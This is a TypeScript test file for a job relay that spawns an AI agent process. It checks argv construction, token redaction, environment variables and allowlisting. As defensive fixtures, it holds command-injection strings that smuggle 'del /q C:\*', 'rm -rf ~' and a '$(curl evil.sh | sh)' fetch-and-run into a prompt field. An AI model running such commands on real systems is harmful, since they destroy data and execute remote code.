import { describe, expect, it } from "bun:test";
import type { ChildProcess } from "node:child_process";
import { EventEmitter } from "node:events";
import {
	buildOmpArgs,
	executeJob,
	fenceEnv,
	type Job,
	parseAllowedModels,
	type SpawnFn,
	scrubJobResult,
} from "../relay/relay";

/** Minimal ChildProcess double: capture spawn inputs, emit scripted output. */
class FakeChild extends EventEmitter {
	readonly stdout = new EventEmitter();
	readonly stderr = new EventEmitter();
	killed = false;

	kill(): boolean {
		this.killed = true;
		return true;
	}
}

interface SpawnCapture {
	command: string;
	args: readonly string[];
	options: { cwd: string; shell?: false; env?: NodeJS.ProcessEnv };
}

function makeSpawn(script: (child: FakeChild) => void): { spawn: SpawnFn; calls: SpawnCapture[] } {
	const calls: SpawnCapture[] = [];
	const spawnImpl: SpawnFn = (command, args, options) => {
		calls.push({ command, args, options });
		const child = new FakeChild();
		queueMicrotask(() => script(child));
		return child as unknown as ChildProcess;
	};
	return { spawn: spawnImpl, calls };
}

const WINDOWS_INJECTION = 'title" && del /q C:\\* && echo "pwned';
const POSIX_INJECTION = "title; rm -rf ~; $(curl evil.sh | sh) `reboot`";

describe("parseAllowedModels", () => {
	it("parses comma-separated ids and treats empty input as allow-nothing", () => {
		expect(parseAllowedModels("combo-a, combo-b ,")).toEqual(["combo-a", "combo-b"]);
		expect(parseAllowedModels("")).toEqual([]);
		expect(parseAllowedModels(undefined)).toEqual([]);
	});
});

describe("buildOmpArgs", () => {
	it("keeps shell metacharacters as one literal argv entry behind a -- separator", () => {
		for (const hostile of [WINDOWS_INJECTION, POSIX_INJECTION]) {
			const args = buildOmpArgs("combo-a", hostile);
			expect(args).toEqual(["--print", "--yolo", "--model", "combo-a", "--", hostile]);
			// The prompt is one argv element, never split or rewritten.
			expect(args[args.length - 1]).toBe(hostile);
			// And it rides behind `--`, so a leading dash cannot become a flag.
			expect(args[args.indexOf("--") + 1]).toBe(hostile);
		}
	});

	it("keeps a flag-shaped prompt positional", () => {
		const args = buildOmpArgs("combo-a", "--api-key steal");
		expect(args.slice(args.indexOf("--"))).toEqual(["--", "--api-key steal"]);
	});
});

describe("scrubJobResult", () => {
	it("redacts the installation token from output and error text", () => {
		const scrubbed = scrubJobResult(
			{
				success: false,
				output: "fatal: unable to access https://x-access-token:ghs_secret123@github.com/a/b.git",
				error: "clone failed with ghs_secret123",
				failureClass: "transient",
			},
			"ghs_secret123",
		);
		expect(scrubbed.output).not.toContain("ghs_secret123");
		expect(scrubbed.error).not.toContain("ghs_secret123");
		expect(scrubbed.output).toContain("[redacted]");
	});

	it("passes results through when no token is present", () => {
		const result = { success: true, output: "done" };
		expect(scrubJobResult(result, undefined)).toEqual(result);
	});
});

describe("fence environment threading", () => {
	it("passes the hooks env through to the spawned process verbatim", async () => {
		const { spawn, calls } = makeSpawn(child => {
			child.emit("close", 0);
		});
		const env = {
			OMPK_FENCE_URL: "https://worker.test/fence-check",
			OMPK_FENCE_JOB: "job-1",
			OMPK_FENCE_ATTEMPT: "attempt-1",
			OMPK_FENCE_TOKEN: "token-1",
			GIT_CONFIG_COUNT: "1",
			GIT_CONFIG_KEY_0: "core.hooksPath",
			GIT_CONFIG_VALUE_0: "/relay/git-hooks",
		};
		await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 1_000, { env });
		expect(calls).toHaveLength(1);
		expect(calls[0]!.options.env).toEqual(env);
	});

	it("spawns with the inherited environment when no hooks env is given", async () => {
		const { spawn, calls } = makeSpawn(child => {
			child.emit("close", 0);
		});
		await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 1_000);
		expect(calls[0]!.options.env).toBeUndefined();
	});

	it("injects GitHub credentials into the child env only for GitHub jobs", () => {
		const base: Job = {
			id: "job-1",
			issueId: "kingkillery/oh-my-pk#7",
			issueIdentifier: "kingkillery/oh-my-pk#7",
			model: "combo-a",
			prompt: "p",
			status: "leased",
			createdAt: "2026-08-06T00:00:00Z",
			attemptId: "attempt-1",
			leaseToken: "lease-1",
		};
		const linearEnv = fenceEnv(base);
		expect(linearEnv.GH_TOKEN).toBe(process.env.GH_TOKEN);
		expect(linearEnv.GIT_CONFIG_COUNT).toBe("1");

		const githubEnv = fenceEnv({
			...base,
			source: "github",
			githubToken: "ghs_abc",
			github: { owner: "kingkillery", repo: "oh-my-pk", number: 7, defaultBranch: "main" },
		});
		expect(githubEnv.GH_TOKEN).toBe("ghs_abc");
		expect(githubEnv.GIT_CONFIG_COUNT).toBe("2");
		expect(githubEnv.GIT_CONFIG_KEY_1).toBe("url.https://x-access-token:ghs_abc@github.com/.insteadOf");
		expect(githubEnv.GIT_CONFIG_VALUE_1).toBe("https://github.com/");
		expect(githubEnv.GIT_CONFIG_KEY_0).toBe("core.hooksPath");
	});
});

describe("executeJob", () => {
	it("rejects a model that is not allowlisted without spawning anything", async () => {
		const { spawn, calls } = makeSpawn(() => {});
		const result = await executeJob(
			{ model: "model-injected-by-issue", prompt: "whatever" },
			["combo-a"],
			spawn,
			1_000,
		);
		expect(result.success).toBe(false);
		expect(result.error).toContain("allowlist");
		// Another relay may carry this model: retryable, not terminal.
		expect(result.failureClass).toBe("transient");
		expect(calls).toHaveLength(0);
	});

	it("dispatches an allowed model without a shell and returns the child's output", async () => {
		const { spawn, calls } = makeSpawn(child => {
			child.stdout.emit("data", "task complete");
			child.emit("close", 0);
		});
		const result = await executeJob({ model: "combo-a", prompt: WINDOWS_INJECTION }, ["combo-a"], spawn, 1_000);
		expect(result).toEqual({ success: true, output: "task complete", error: undefined });
		expect(calls).toHaveLength(1);
		const call = calls[0]!;
		// No shell: options carry no shell flag, and argv holds the hostile prompt verbatim.
		expect("shell" in call.options ? call.options.shell : undefined).toBeFalsy();
		expect(call.args[call.args.length - 1]).toBe(WINDOWS_INJECTION);
		expect(call.command).not.toContain(WINDOWS_INJECTION);
	});

	it("reports a failing exit code with stderr as the error", async () => {
		const { spawn } = makeSpawn(child => {
			child.stderr.emit("data", "model exploded");
			child.emit("close", 3);
		});
		const result = await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 1_000);
		expect(result.success).toBe(false);
		expect(result.error).toBe("model exploded");
		// Clean non-zero exits are deterministic: never auto-retried.
		expect(result.failureClass).toBe("permanent");
	});

	it("times out a hung child and kills it", async () => {
		let spawned: FakeChild | undefined;
		const { spawn } = makeSpawn(child => {
			spawned = child; // never emits close
		});
		const result = await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 10);
		expect(result.success).toBe(false);
		expect(result.error).toContain("timed out");
		expect(result.failureClass).toBe("transient");
		expect(spawned?.killed).toBe(true);
	});

	it("classifies a spawn error as transient", async () => {
		const { spawn } = makeSpawn(child => {
			child.emit("error", new Error("EBUSY: omp binary locked"));
		});
		const result = await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 1_000);
		expect(result.success).toBe(false);
		expect(result.failureClass).toBe("transient");
	});
});
